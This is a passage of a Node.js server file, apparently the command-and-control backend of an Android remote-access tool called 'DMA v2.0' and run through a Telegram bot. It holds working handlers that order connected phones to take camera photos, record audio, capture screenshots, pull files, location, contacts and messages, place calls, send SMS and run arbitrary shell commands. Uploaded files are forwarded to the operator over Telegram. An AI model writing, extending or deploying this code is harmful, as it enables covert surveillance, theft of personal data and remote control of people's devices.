        if (sendCommandToDevice(deviceId, 'get_consents')) {
            bot.sendMessage(chatId, `🔐 Fetching consent status...`).catch(e => {});
        }
    });

    // === REVOKE_ALL COMMAND ===
    bot.onText(/\/revoke_all (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        if (!connectedDevices.has(deviceId)) {
            return bot.sendMessage(chatId, `❌ Device not connected`).catch(e => {});
        }
        
        if (sendCommandToDevice(deviceId, 'revoke_all_consents', { reason: 'Revoked by admin via command' })) {
            bot.sendMessage(chatId, `⚠️ Revoking ALL consents...`).catch(e => {});
        }
    });

    // === BROWSE COMMAND ===
    bot.onText(/\/browse (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        if (!connectedDevices.has(deviceId)) {
            return bot.sendMessage(chatId, `❌ Device not connected`).catch(e => {});
        }
        
        setUserSession(chatId, { state: 'awaiting_browse_path', deviceId });
        bot.sendMessage(chatId, 
            `📁 *Enter path to browse*\n` +
            `Examples:\n` +
            `• \`/storage/emulated/0/Download\`\n` +
            `• \`/storage/emulated/0/DCIM\`\n` +
            `• \`/\` (root directory)`,
            { parse_mode: 'Markdown', reply_markup: removeKeyboard.reply_markup }
        ).catch(e => {});
    });

    // === DOWNLOAD COMMAND ===
    bot.onText(/\/download (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        if (!connectedDevices.has(deviceId)) {
            return bot.sendMessage(chatId, `❌ Device not connected`).catch(e => {});
        }
        
        setUserSession(chatId, { state: 'awaiting_download_path', deviceId });
        bot.sendMessage(chatId, 
            `📥 *Enter full path to file*\n` +
            `Example: \`/storage/emulated/0/Download/file.pdf\``,
            { parse_mode: 'Markdown', reply_markup: removeKeyboard.reply_markup }
        ).catch(e => {});
    });

    // === CAMERA COMMAND ===
    bot.onText(/\/camera (.+) (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        const type = match[2].toLowerCase();
        
        if (!connectedDevices.has(deviceId)) {
            return bot.sendMessage(chatId, `❌ Device not connected`).catch(e => {});
        }
        
        const cameraType = type.includes('front') ? 'front' : 'rear';
        if (sendCommandToDevice(deviceId, 'take_photo', { camera: cameraType })) {
            bot.sendMessage(chatId, `📷 Taking ${cameraType} camera photo...`).catch(e => {});
        }
    });

    // === RECORD COMMAND ===
    bot.onText(/\/record (.+) (\d+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        const seconds = parseInt(match[2]);
        
        if (!connectedDevices.has(deviceId)) {
            return bot.sendMessage(chatId, `❌ Device not connected`).catch(e => {});
        }
        
        if (sendCommandToDevice(deviceId, 'record_audio', { seconds })) {
            bot.sendMessage(chatId, `🎤 Recording ${seconds} seconds...`).catch(e => {});
        }
    });

    // === CALL COMMAND ===
    bot.onText(/\/call (.+) (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        const number = match[2].trim();
        
        if (!connectedDevices.has(deviceId)) {
            return bot.sendMessage(chatId, `❌ Device not connected`).catch(e => {});
        }
        
        if (sendCommandToDevice(deviceId, 'make_call', { number })) {
            bot.sendMessage(chatId, `📞 Calling ${number}...`).catch(e => {});
        }
    });

    // === SMS COMMAND ===
    bot.onText(/\/sms (.+) (.+) (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        const number = match[2].trim();
        const message = match[3].trim();
        
        if (!connectedDevices.has(deviceId)) {
            return bot.sendMessage(chatId, `❌ Device not connected`).catch(e => {});
        }
        
        if (sendCommandToDevice(deviceId, 'send_sms', { number, message })) {
            bot.sendMessage(chatId, `💬 Sending SMS to ${number}...`).catch(e => {});
        }
    });

    // === SHELL COMMAND ===
    bot.onText(/\/shell (.+) (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        const command = match[2].trim();
        
        if (!connectedDevices.has(deviceId)) {
            return bot.sendMessage(chatId, `❌ Device not connected`).catch(e => {});
        }
        
        if (sendCommandToDevice(deviceId, 'execute', { cmd: command })) {
            bot.sendMessage(chatId, `🖥️ Executing command...`).catch(e => {});
        }
    });

    // === REVOKE COMMAND ===
    bot.onText(/\/revoke (.+) (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        const type = match[2].toUpperCase();
        
        if (!connectedDevices.has(deviceId)) {
            return bot.sendMessage(chatId, `❌ Device not connected`).catch(e => {});
        }
        
        if (sendCommandToDevice(deviceId, 'revoke_consent', { type, reason: 'Revoked by admin via command' })) {
            bot.sendMessage(chatId, `🚫 Revoking ${type} consent...`).catch(e => {});
        }
    });

    // === MESSAGE HANDLER - BUTTONS ===
    bot.on('message', (msg) => {
        const chatId = msg.chat.id;
        const text = msg.text;
        
        if (chatId.toString() !== adminId || !text) return;
        
        // Main menu buttons
        if (text === '📱 Devices') {
            showDeviceList(chatId);
        }
        else if (text === '❓ Help') {
            bot.sendMessage(chatId, 'Type /help for commands', { 
                reply_markup: mainKeyboard.reply_markup 
            }).catch(e => {});
        }
        else if (text === '🔙 Back') {
            bot.sendMessage(chatId, 'Main menu', { 
                reply_markup: mainKeyboard.reply_markup 
            }).catch(e => {});
            clearUserSession(chatId);
        }
        // Device selection
        else if (text.includes('📱') && text.includes('(') && text.includes(')')) {
            const deviceEntry = Array.from(connectedDevices.entries()).find(([id]) => 
                text.includes(id.substring(0, 4))
            );
            
            if (deviceEntry) {
                const [deviceId, device] = deviceEntry;
                const model = device.deviceInfo?.model?.split(' ')[0] || 'Device';
                
                bot.sendMessage(chatId, 
                    `📱 *${model}*\n━━━━━━━━━━━━━\nID: \`${deviceId}\`\n\n*Select action:*`,
                    { 
                        parse_mode: 'Markdown',
                        reply_markup: deviceActionMenu(deviceId).reply_markup 
                    }
                ).catch(e => {});
                
                clearUserSession(chatId);
            }
        }
        
        // Input handlers for browse/download/call/sms/shell
        const session = getUserSession(chatId);
        if (!session) return;
        
        if (session.state === 'awaiting_browse_path' && session.deviceId) {
            const path = text.trim();
            if (sendCommandToDevice(session.deviceId, 'list_files', { path })) {
                bot.sendMessage(chatId, `📁 Browsing ${path}...`, removeKeyboard).catch(e => {});
            }
            clearUserSession(chatId);
        }
        else if (session.state === 'awaiting_download_path' && session.deviceId) {
            const path = text.trim();
            if (sendCommandToDevice(session.deviceId, 'get_file', { path })) {
                bot.sendMessage(chatId, `📥 Downloading ${path}...`, removeKeyboard).catch(e => {});
            }
            clearUserSession(chatId);
        }
        else if (session.state === 'awaiting_call_number' && session.deviceId) {
            const number = text.trim();
            if (sendCommandToDevice(session.deviceId, 'make_call', { number })) {
                bot.sendMessage(chatId, `📞 Calling ${number}...`, removeKeyboard).catch(e => {});
            }
            clearUserSession(chatId);
        }
        else if (session.state === 'awaiting_sms_number' && session.deviceId) {
            const number = text.trim();
            setUserSession(chatId, { state: 'awaiting_sms_text', deviceId: session.deviceId, number });
            bot.sendMessage(chatId, `💬 Enter message for ${number}:`, removeKeyboard).catch(e => {});
        }
        else if (session.state === 'awaiting_sms_text' && session.deviceId) {
            const message = text.trim();
            if (sendCommandToDevice(session.deviceId, 'send_sms', { number: session.number, message })) {
                bot.sendMessage(chatId, `💬 Sending SMS...`, removeKeyboard).catch(e => {});
            }
            clearUserSession(chatId);
        }
        else if (session.state === 'awaiting_shell_command' && session.deviceId) {
            const command = text.trim();
            if (sendCommandToDevice(session.deviceId, 'execute', { cmd: command })) {
                bot.sendMessage(chatId, `🖥️ Executing command...`, removeKeyboard).catch(e => {});
            }
            clearUserSession(chatId);
        }
    });

    // === CALLBACK QUERY HANDLER ===
    bot.on('callback_query', async (callbackQuery) => {
        const chatId = callbackQuery.message.chat.id;
        const messageId = callbackQuery.message.message_id;
        const data = callbackQuery.data;
        
        if (chatId.toString() !== adminId) {
            await bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Unauthorized' }).catch(e => {});
            return;
        }
        
        // Answer callback immediately
        await bot.answerCallbackQuery(callbackQuery.id).catch(e => {});
        
        // Parse action and deviceId
        const parts = data.split('_');
        const action = parts[0];
        
        // Handle different callback formats
        let deviceId, subAction, seconds, consentType;
        
        if (action === 'camera' && (parts[1] === 'front' || parts[1] === 'rear')) {
            subAction = parts[1];
            deviceId = parts.slice(2).join('_');
        } else if (action === 'record' && parts.length >= 3) {
            seconds = parseInt(parts[1]);
            deviceId = parts.slice(2).join('_');
        } else if (action === 'revoke' && parts.length >= 3) {
            consentType = parts[1];
            deviceId = parts.slice(2).join('_');
        } else {
            deviceId = parts.slice(1).join('_');
        }
        
        const device = connectedDevices.get(deviceId);
        if (!device) {
            await bot.sendMessage(chatId, `❌ Device not found or disconnected`).catch(e => {});
            return;
        }
        
        const model = device.deviceInfo?.model?.split(' ')[0] || 'Device';
        
        // Handle each action
        switch(action) {
            case 'info':
                if (sendCommandToDevice(deviceId, 'get_device_info')) {
                    await bot.sendMessage(chatId, `ℹ️ Getting info for ${model}...`).catch(e => {});
                }
                break;
                
            case 'apps':
                if (sendCommandToDevice(deviceId, 'list_apps')) {
                    await bot.sendMessage(chatId, `📱 Getting apps list for ${model}...`).catch(e => {});
                }
                break;
                
            case 'screenshot':
                if (sendCommandToDevice(deviceId, 'take_screenshot')) {
                    await bot.sendMessage(chatId, `📸 Taking screenshot on ${model}...`).catch(e => {});
                }
                break;
                
            case 'camera':
                if (subAction) {
                    if (sendCommandToDevice(deviceId, 'take_photo', { camera: subAction })) {
                        await bot.sendMessage(chatId, `📷 Taking ${subAction} camera photo...`).catch(e => {});
                    }
                } else {
                    await bot.sendMessage(chatId, 
                        `📷 *Select camera for ${model}:*`,
                        { parse_mode: 'Markdown', reply_markup: cameraMenu(deviceId).reply_markup }
                    ).catch(e => {});
                }
                break;
                
            case 'record':
                if (seconds) {
                    if (sendCommandToDevice(deviceId, 'record_audio', { seconds })) {
                        await bot.sendMessage(chatId, `🎤 Recording ${seconds}s on ${model}...`).catch(e => {});
                    }
                } else {
                    await bot.sendMessage(chatId, 
                        `🎤 *Select duration for ${model}:*`,
                        { parse_mode: 'Markdown', reply_markup: recordMenu(deviceId).reply_markup }
                    ).catch(e => {});
                }
                break;
                
            case 'location':
                if (sendCommandToDevice(deviceId, 'get_location')) {
                    await bot.sendMessage(chatId, `📍 Getting location from ${model}...`).catch(e => {});
                }
                break;
                
            case 'browse':
                setUserSession(chatId, { state: 'awaiting_browse_path', deviceId });
                await bot.sendMessage(chatId, 
                    `📁 *Enter path to browse on ${model}:*\n` +
                    `Example: \`/storage/emulated/0/Download\``,
                    { parse_mode: 'Markdown', reply_markup: removeKeyboard.reply_markup }
                ).catch(e => {});
                break;
                
            case 'download':
                setUserSession(chatId, { state: 'awaiting_download_path', deviceId });
                await bot.sendMessage(chatId, 
                    `📥 *Enter file path to download from ${model}:*\n` +
                    `Example: \`/storage/emulated/0/Download/file.pdf\``,
                    { parse_mode: 'Markdown', reply_markup: removeKeyboard.reply_markup }
                ).catch(e => {});
                break;
                
            case 'call':
                setUserSession(chatId, { state: 'awaiting_call_number', deviceId });
                await bot.sendMessage(chatId, 
                    `📞 *Enter phone number to call from ${model}:*`,
                    { parse_mode: 'Markdown', reply_markup: removeKeyboard.reply_markup }
                ).catch(e => {});
                break;
                
            case 'sms':
                setUserSession(chatId, { state: 'awaiting_sms_number', deviceId });
                await bot.sendMessage(chatId, 
                    `💬 *Enter phone number to send SMS from ${model}:*`,
                    { parse_mode: 'Markdown', reply_markup: removeKeyboard.reply_markup }
                ).catch(e => {});
                break;
                
            case 'contacts':
                if (sendCommandToDevice(deviceId, 'list_contacts')) {
                    await bot.sendMessage(chatId, `📒 Getting contacts from ${model}...`).catch(e => {});
                }
                break;
                
            case 'messages':
                if (sendCommandToDevice(deviceId, 'get_messages')) {
                    await bot.sendMessage(chatId, `📨 Getting messages from ${model}...`).catch(e => {});
                }
                break;
                
            case 'shell':
                setUserSession(chatId, { state: 'awaiting_shell_command', deviceId });
                await bot.sendMessage(chatId, 
                    `🖥️ *Enter shell command for ${model}:*`,
                    { parse_mode: 'Markdown', reply_markup: removeKeyboard.reply_markup }
                ).catch(e => {});
                break;
                
            case 'privacy':
                if (sendCommandToDevice(deviceId, 'get_consents')) {
                    await bot.sendMessage(chatId, `🔐 Fetching consent status for ${model}...`).catch(e => {});
                }
                break;
                
            case 'revoke':
                if (consentType) {
                    if (sendCommandToDevice(deviceId, 'revoke_consent', { 
                        type: consentType, 
                        reason: 'Revoked via inline button' 
                    })) {
                        await bot.sendMessage(chatId, `🚫 Revoked ${consentType} consent on ${model}`).catch(e => {});
                    }
                } else {
                    await bot.sendMessage(chatId, 
                        `🚫 *Select consent to revoke on ${model}:*`,
                        { parse_mode: 'Markdown', reply_markup: revokeMenu(deviceId).reply_markup }
                    ).catch(e => {});
                }
                break;
                
            case 'revoke_all':
                if (sendCommandToDevice(deviceId, 'revoke_all_consents', { 
                    reason: 'Revoked all via inline button' 
                })) {
                    await bot.sendMessage(chatId, `⚠️ Revoking ALL consents on ${model}...`).catch(e => {});
                }
                break;
        }
    });
}

// ============================================
// API ENDPOINTS
// ============================================

// ============================================
// FIXED FILE UPLOAD ENDPOINT - Works on Render/Heroku
// ============================================
app.post('/api/upload', upload.single('file'), async (req, res) => {
    try {
        const deviceId = req.headers['device-id'];
        const fileType = req.headers['file-type'] || 'file';
        
        if (!deviceId || !req.file) {
            return res.status(400).json({ error: 'Missing device ID or file' });
        }
        
        const fileSize = (req.file.size / 1024 / 1024).toFixed(2);
        const fileName = req.file.originalname;
        const filePath = req.file.path;
        
        logEvent('FILE_UPLOAD', deviceId, `${fileName} (${fileSize}MB) - Type: ${fileType}`);
        
        if (bot) {
            try {
                // OPTION 1: Send file directly from disk
                await bot.sendDocument(adminId, filePath, {
                    caption: `📁 *File Received*\n` +
                            `Device: \`${deviceId.substring(0, 8)}...\`\n` +
                            `Name: \`${fileName}\`\n` +
                            `Type: ${fileType}\n` +
                            `Size: ${fileSize}MB`,
                    parse_mode: 'Markdown'
                });
                
                logEvent('FILE_SENT', deviceId, `Successfully sent to Telegram: ${fileName}`);
                
                // Clean up after successful send
                setTimeout(() => {
                    try {
                        if (fs.existsSync(filePath)) {
                            fs.unlinkSync(filePath);
                            logEvent('FILE_CLEANUP', deviceId, `Deleted: ${filePath}`);
                        }
                    } catch (e) {
                        logEvent('ERROR', deviceId, `Failed to delete file: ${e.message}`);
                    }
                }, 5 * 60 * 1000);
                
            } catch (telegramError) {
                // OPTION 2: If direct send fails, try reading file as buffer
                try {
                    logEvent('WARNING', deviceId, `Direct send failed, trying buffer method: ${telegramError.message}`);
                    
                    const fileBuffer = fs.readFileSync(filePath);
                    await bot.sendDocument(adminId, fileBuffer, {
                        filename: fileName,
                        caption: `📁 *File Received (buffer)*\n` +
                                `Device: \`${deviceId.substring(0, 8)}...\`\n` +
                                `Name: \`${fileName}\`\n` +
                                `Type: ${fileType}\n` +
                                `Size: ${fileSize}MB`,
                        parse_mode: 'Markdown'
                    }, {
                        filename: fileName,
                        contentType: req.file.mimetype || 'application/octet-stream'
                    });
                    
                    logEvent('FILE_SENT', deviceId, `Successfully sent via buffer: ${fileName}`);
                    
                } catch (bufferError) {
                    logEvent('ERROR', deviceId, `All send methods failed: ${bufferError.message}`);
                    throw bufferError;
                }
            }
        }
        
        res.json({ 
            success: true, 
            message: 'File uploaded successfully',
            file: fileName,
            size: fileSize,
            type: fileType
        });
        
    } catch (error) {
        logEvent('ERROR', 'system', `Upload error: ${error.message}`);
        res.status(500).json({ error: 'Upload failed: ' + error.message });
    }
});

// Health check
app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        devices: connectedDevices.size,
        uptime: process.uptime(),
        timestamp: new Date().toISOString(),
        version: '2.0.0'
    });
});

// ============================================
// CLEANUP JOBS
// ============================================

// Clean old sessions (every 5 minutes)
setInterval(() => {
    const now = Date.now();
    userSessions.forEach((session, userId) => {
        if (now - session.timestamp > 10 * 60 * 1000) {
            userSessions.delete(userId);
            logEvent('CLEANUP', 'system', `Removed expired session: ${userId}`);
        }
    });
}, 5 * 60 * 1000);

// Clean old pending commands (every minute)
setInterval(() => {
    const now = Date.now();
    pendingCommands.forEach((cmd, cmdId) => {
        if (now - cmd.timestamp > 2 * 60 * 1000) {
            pendingCommands.delete(cmdId);
            logEvent('CLEANUP', cmd.deviceId, `Removed expired command: ${cmdId.substring(0, 8)}`);
        }
    });
}, 60 * 1000);

// Clean old files (every hour)
setInterval(() => {
    const now = Date.now();
    const maxAge = 12 * 60 * 60 * 1000; // 12 hours
    
    ['uploads', 'screenshots', 'recordings', 'photos', 'temp'].forEach(dir => {
        if (fs.existsSync(dir)) {
            fs.readdirSync(dir).forEach(file => {
                const filePath = path.join(dir, file);
                try {
                    const stats = fs.statSync(filePath);
                    if (now - stats.mtimeMs > maxAge) {
                        fs.unlinkSync(filePath);
                        logEvent('FILE_CLEANUP', 'system', `Deleted old file: ${filePath}`);
                    }
                } catch (e) {}
            });
        }
    });
}, 60 * 60 * 1000);

// ============================================
// START SERVER
// ============================================
server.listen(PORT, '0.0.0.0', async () => {
    console.log('\n\x1b[36m%s\x1b[0m', '🚀 DMA v2.0');
    console.log('\x1b[36m%s\x1b[0m', '━━━━━━━━━━━━━━━━━━━━━');
    console.log(`📡 Port: ${PORT}`);
    console.log(`🔧 Trust proxy: Enabled`);
    console.log(`📁 Upload directory: ${path.resolve('./uploads')}`);
    
    let retries = 0;
    while (retries < 3) {
        try {
            bot = await startBot();
            if (bot) break;
        } catch (e) {
            retries++;
            console.log(`⚠️ Bot initialization attempt ${retries}/3 failed, retrying...`);
            await new Promise(r => setTimeout(r, 3000));
        }
    }
    
    console.log(`🤖 Bot: ${bot ? '✅ Connected' : '❌ Failed'}`);
    console.log(`📱 Commands: 20 registered`);
    console.log(`📊 Devices: 0 connected`);
    console.log('\x1b[36m%s\x1b[0m', '━━━━━━━━━━━━━━━━━━━━━\n');
});

// ============================================
// GRACEFUL SHUTDOWN
// ============================================
process.on('SIGTERM', shutdown);
process.on('SIGINT', shutdown);

function shutdown() {
    console.log('\n🛑 Shutting down...');
    
    // Notify all connected devices
    connectedDevices.forEach((device, deviceId) => {
        try {
            device.ws.close(1000, 'Server shutting down');
            logEvent('DEVICE_DISCONNECTED', deviceId, 'Server shutdown');
        } catch (e) {}
    });
    
    if (bot) {
        bot.stopPolling();
        console.log('🤖 Bot polling stopped');
    }
    
    wss.close(() => {
        console.log('📡 WebSocket server closed');
        server.close(() => {
            console.log('✅ Server shutdown complete');
            process.exit(0);
        });
    });
}

// ============================================
// EXPORTS
// ============================================
module.exports = { app, server, wss, connectedDevices };
